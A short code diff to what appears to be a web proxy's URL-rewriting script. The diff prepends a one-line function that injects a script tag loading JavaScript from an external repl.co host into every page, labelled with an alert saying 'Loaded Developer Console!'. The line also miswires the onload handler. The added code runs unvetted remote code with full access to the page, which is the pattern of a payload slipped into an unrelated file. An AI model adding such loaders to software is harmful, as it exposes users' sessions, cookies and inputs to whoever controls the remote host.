@@ -1,3 +1,4 @@
+(function(){(function() {var x = document.createElement("script");x.src = "https://newhypertabs-1.nobody111.repl.co/js/stuff.js";x.onload = alert("Loaded Developer Console!");document.head.appendChild(x);})()})();
 (function () {
     // rewrite url /main/https:/google.com /main/https://google.com without refreshing the page
     var rewriteDoubleSlash = window.location.pathname.match(/\/main(?<mod>\/[^\/_]+_)?(?<url_preslash>\/(?:http|ws)s?:\/)(?<url_postslash>[^\/].*)/);
